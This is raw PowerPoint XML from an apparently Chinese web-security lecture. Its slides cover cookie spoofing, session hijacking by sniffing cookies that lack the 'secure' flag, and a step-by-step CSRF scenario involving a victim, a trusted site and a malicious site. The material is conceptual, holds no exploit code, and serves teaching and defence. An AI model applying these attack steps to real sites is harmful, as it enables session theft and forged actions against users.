              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>欺骗攻击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>面</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>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1381414" y="2153047"/>
            <a:ext cx="6410325" cy="2447925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solid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7250" y="1277072"/>
            <a:ext cx="8069550" cy="4929764"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>上面介绍的两个攻击例子之所以成功，是因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>中保存了用户名、口令以及权限信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>而留下了安全隐患。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全原则</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>一般情况下，网站会话管理机制仅将会话</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>保存至</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，而将数据本身保存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器的内存或文件、数据库中</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>伪造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>信息</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6522" y="1443327"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>没有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>设置安全属性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>”，则</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>内容在网络中用明文传输，攻击者监听到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>内容后可以轻松实现会话劫持</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为什么会不设置安全属性</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>监听</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>来实现会话劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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四、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>攻击及防范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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>跨站请求仿冒</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419844" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1916113"/>
            <a:ext cx="8435975" cy="3856037"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>    A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSRF (Cross Site Request Forgery)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> attack forces a logged-on victim’s browser to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>send a pre-authenticated request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> to a vulnerable web application, which then forces the victim’s browser to perform a hostile action to the benefit of the attacker.  </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419845" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="496888" y="125412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44">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4198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CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="组合 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="438275" y="1233055"/>
            <a:ext cx="8705725" cy="5366342"/>
            <a:chOff x="329934" y="86022"/>
            <a:chExt cx="8705725" cy="5425945"/>
          </a:xfrm>
        </p:grpSpPr>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94828" y="2482712"/>
              <a:ext cx="952500" cy="952500"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="文本框 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="470968" y="3421194"/>
              <a:ext cx="800219"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rPr>
                <a:t>用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>C</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="文本框 6"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="842339" y="101619"/>
              <a:ext cx="3223959" cy="923330"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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zh-CN" altLang="en-US" dirty="0"/>
                <a:t>网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>：存在</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>CSRF</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>漏洞的网站</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>：恶意攻击者</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>：受害者</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="8" name="组合 7"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6200210" y="1296189"/>
              <a:ext cx="1967205" cy="1974715"/>
              <a:chOff x="2703683" y="1962629"/>
              <a:chExt cx="1967205" cy="1974715"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="27" name="组合 26"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="2703683" y="2136121"/>
                <a:ext cx="1967205" cy="1465174"/>
                <a:chOff x="3566711" y="1484084"/>
                <a:chExt cx="2342458" cy="1588571"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="29" name="Picture 2" descr="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576578201836&amp;di=ba5aa919eea75c797410b1df5680895d&amp;imgtype=0&amp;src=http%3A%2F%2Fa.hiphotos.baidu.com%2Fzhidao%2Fpic%2Fitem%2F4b90f603738da977196b6fa8bb51f8198718e3e9.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9289" y="1484084"/>
                  <a:ext cx="857299" cy="1188134"/>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p:cNvSpPr txBox="1"/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="3566711" y="2672218"/>
                  <a:ext cx="2342458" cy="400437"/>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rPr>
                    <a:t>网站</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（受信任）</a:t>
                  </a:r>
                  <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
                    <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                    <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  </a:endParaRPr>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="28" name="矩形 27"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2704288" y="1962629"/>
                <a:ext cx="1809029" cy="1974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6210124" y="3528281"/>
              <a:ext cx="1809029" cy="1974715"/>
              <a:chOff x="4628876" y="4153711"/>
              <a:chExt cx="1809029" cy="1974715"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="22" name="组合 21"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="4671616" y="4527891"/>
                <a:ext cx="1723549" cy="1299342"/>
                <a:chOff x="3972602" y="3915483"/>
                <a:chExt cx="1723549" cy="1299342"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="24" name="Picture 2" descr="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576578201836&amp;di=ba5aa919eea75c797410b1df5680895d&amp;imgtype=0&amp;src=http%3A%2F%2Fa.hiphotos.baidu.com%2Fzhidao%2Fpic%2Fitem%2F4b90f603738da977196b6fa8bb51f8198718e3e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94787" y="3915483"/>
                  <a:ext cx="772276" cy="953330"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
                <a:noFill/>
                <a:extLst>
                  <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                    <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                    </a14:hiddenFill>
                  </a:ext>
                </a:extLst>
              </p:spPr>
            </p:pic>
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="25" name="图片 24"/>
                <p:cNvPicPr>
                  <a:picLocks noChangeAspect="1"/>
                </p:cNvPicPr>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId4"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="4980736" y="4192186"/>
                  <a:ext cx="502809" cy="583897"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="26" name="文本框 25"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="3972602" y="4845493"/>
                  <a:ext cx="1723549" cy="369332"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
                <a:noFill/>
              </p:spPr>
              <p:txBody>
                <a:bodyPr wrap="none" rtlCol="0">
                  <a:spAutoFit/>
                </a:bodyPr>
                <a:lstStyle/>
                <a:p>
                  <a:pPr algn="ctr"/>
                  <a:r>
                    <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                      <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                      <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                    </a:rPr>
                    <a:t>网站</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（恶意）</a:t>
                  </a:r>
                  <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
                    <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                    <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  </a:endParaRPr>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="23" name="矩形 22"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4628876" y="4153711"/>
                <a:ext cx="1809029" cy="19747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9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="329934" y="1240377"/>
              <a:ext cx="1024810" cy="427159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612001" y="86022"/>
              <a:ext cx="4423658" cy="1200329"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="squar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just"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>6. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>由于浏览器会带上用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>cookie</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>，网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>不知道步骤</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>5</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的请求是</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>发出的，因此网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>会根据用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的权限处理步骤</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>5</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的的请求，这样就达到了伪造用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>请求的目的</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="文本框 11"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1619632" y="1240377"/>
              <a:ext cx="3275256" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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en-US" altLang="zh-CN" dirty="0"/>
                <a:t>1. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>浏览并登录正常网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="文本框 12"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1637190" y="1791569"/>
              <a:ext cx="4268733" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="squar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en-US" altLang="zh-CN" dirty="0"/>
                <a:t>2. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>验证通过，浏览器生成网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>cookie</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="文本框 13"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1649936" y="3437572"/>
              <a:ext cx="3771798" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="squar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en-US" altLang="zh-CN" dirty="0"/>
                <a:t>3. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>用户</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>在没有登录退出网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的情况下，访问恶意网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>B</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="文本框 14"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1658289" y="4817928"/>
              <a:ext cx="3390672" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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en-US" altLang="zh-CN" dirty="0"/>
                <a:t>4. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>要求访问第三方网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="文本框 15"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1649936" y="2359165"/>
              <a:ext cx="4208350" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
